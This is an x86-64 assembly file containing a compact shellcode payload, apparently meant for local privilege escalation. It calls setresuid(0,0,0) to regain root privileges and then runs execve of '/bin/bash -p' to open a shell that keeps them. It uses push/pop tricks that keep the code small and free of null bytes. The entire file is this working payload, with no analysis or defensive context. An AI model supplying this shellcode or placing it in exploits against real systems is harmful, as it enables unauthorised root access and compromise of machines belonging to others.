.code64
.globl _start
.section .text

_start:
	#movq	$0xcccccccccccccccc, %rax
	#movq	$0xcccccccccccccccc, %rbx
	#movq	$0xcccccccccccccccc, %rcx
	#movq	$0xcccccccccccccccc, %rdx
	#movq	$0xcccccccccccccccc, %rsi
	#movq	$0xcccccccccccccccc, %rdi
	#movq	$0xcccccccccccccccc, %rbp

	pushq	$117
	popq	%rax							# rax = 117
	cdq										# rdx = 0
	pushq	%rdx
	pushq	%rdx
	popq	%rdi							# rdi = 0
	popq	%rsi							# rsi = 0
	syscall									# setresuid(0, 0, 0), Revive root privileges.
	pushq	$59
	popq	%rax							# rax = 59
	pushq	$0x68							# h
	movq	$0x7361622f6e69622f, %rdi		# /bin/bas
	pushq	%rdi
	pushq	%rsp
	popq	%rdi							# rdi(argv[0]) = "/bin/bash"
	pushq	%rdx							# null character
	pushw	$0x702d							# -p
	pushq	%rsp
	popq	%rsi							# rsi = "-p"
	pushq	%rdx							# null pointer
	pushq	%rsp
	popq	%rdx							# rdx(envp) = {NULL}
	pushq	%rsi							# "-p"
	pushq	%rdi							# "/bin/bash"
	pushq	%rsp
	popq	%rsi							# rsi(argv) = {"/bin/bash", "-p", NULL}
	syscall									# execve("/bin/bash", ["/bin/bash", "-p", NULL], [NULL])
